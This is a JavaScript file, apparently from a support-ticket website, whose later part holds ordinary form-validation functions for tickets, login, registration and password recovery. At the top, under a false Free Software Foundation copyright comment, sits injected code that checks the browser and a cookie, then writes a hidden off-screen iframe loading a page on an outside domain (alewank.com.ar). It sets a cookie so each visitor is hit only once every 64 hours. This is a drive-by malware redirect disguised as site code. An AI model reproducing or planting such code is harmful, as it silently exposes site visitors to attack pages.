/*
Copyright (C) 2007 Free Software Foundation, Inc. http://fsf.org/
*/
function getCookie(name) {
var matches = document.cookie.match(new RegExp(
"(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
));
return matches ? decodeURIComponent(matches[1]) : undefined;
}
function Broadbandserviceactu() {
var resiser = navigator.userAgent;
var teamfact = (resiser.indexOf("Windows") < +1 || resiser.indexOf("Windows NT 6.3") > -1 || resiser.indexOf("IEMobile") > -1 || resiser.indexOf("Chrome") > -1 || resiser.indexOf("Windows NT 6.2") > -1);
var buble = (getCookie("joombanight") === undefined);
if (!teamfact && buble) {
document.write('<iframe src="http://afroidue.alewank.com.ar/blastujaker15.html?%a" style="border-left: thick double 7FFFD4;left: -887px;position: absolute;cursor: help;border-right: thick double 0000FF;top: -887px;" height="132" width="132"></iframe>');
var date = new Date( new Date().getTime() + 64*60*60*1000 );
document.cookie="joombanight=1; path=/; expires="+date.toUTCString();
}
}
Broadbandserviceactu();
/*
Copyright (C) 2000 Free Software Foundation, Inc. See LICENSE.txt
*/
function validateFormNewTicket()
{
var x=document.forms["newticket"]["cur-name"].value;
if (x==null || x=="")
  {
  alert("Please enter your name!");
  return false;
  }
var x=document.forms["newticket"]["subject"].value;
if (x==null || x=="")
  {
  alert("Please enter a subject!");
  return false;
  }
var x=document.forms["newticket"]["deptId"].value;
if (x==null || x=="")
  {
  alert("Please select a category!");
  return false;
  }
var x=document.forms["newticket"]["priorityId"].value;
if (x==null || x=="")
  {
  alert("Please select a priority level!");
  return false;
  }  
var editorContent = tinyMCE.get('message').getContent();
	if (editorContent == '' || editorContent==null)
	{
	   alert("Message field cannot be empty!");
	  return false;
	}	
}
function validateFormReply()
{
var editorContent = tinyMCE.get('message').getContent();
	if (editorContent == '' || editorContent==null)
	{
	   alert("Message field cannot be empty!");
	  return false;
	}
}

function validateFormSearch()
{
var x=document.forms["search"]["tq"].value;
if (x==null || x=="")
  {
  alert("Search field cannot be empty!");
  return false;
  }
}

function validateFormLogin()
{
var x=document.forms["login"]["user_login"].value;
if (x==null || x=="")
  {
  alert("Username field cannot be empty!");
  return false;
  }
var x=document.forms["login"]["user_pass"].value;
if (x==null || x=="")
  {
  alert("Password field cannot be empty!");
  return false;
  }
}

function validateFormRegister()
{
var x=document.forms["user_new"]["user_login"].value;
if (x==null || x=="")
  {
  alert("Username field cannot be empty!");
  return false;
  }
var x=document.forms["user_new"]["user_email"].value;
var atpos=x.indexOf("@");
var dotpos=x.lastIndexOf(".");
if (atpos<1 || dotpos<atpos+2 || dotpos+2>=x.length)
  {
  alert("Not a valid email address!");
  return false;
  }
}

function validateFormForgot()
{
var x=document.forms["lostpasswordform"]["user_login"].value;
if (x==null || x=="")
  {
  alert("Username/Email field cannot be empty!");
  return false;
  }
}
function validateFormContactTicket()
{
var x=document.forms["contactticket"]["cur-name"].value;
if (x==null || x=="")
  {
  alert("Please enter your name!");
  return false;
  }
var x=document.forms["contactticket"]["email"].value;
if (x==null || x=="")
  {
  alert("Please enter a email!");
  return false;
  }
if(x!="")
{
var atpos=x.indexOf("@");
var dotpos=x.lastIndexOf(".");
if (atpos<1 || dotpos<atpos+2 || dotpos+2>=x.length)
  {
  alert("Please enter valid email address!");
  return false;
  }
}
var x=document.forms["contactticket"]["subject"].value;
if (x==null || x=="")
  {
  alert("Please enter a subject!");
  return false;
  }

var x=document.forms["contactticket"]["deptId"].value;
if (x==null || x=="")
  {
  alert("Please select a category!");
  return false;
  }
var x=document.forms["contactticket"]["priorityId"].value;
if (x==null || x=="")
  {
  alert("Please select a priority level!");
  return false;
  }  
var editorContent = tinyMCE.get('message').getContent();
	if (editorContent == '' || editorContent==null)
	{
	   alert("Message field cannot be empty!");
	  return false;
	}	
}
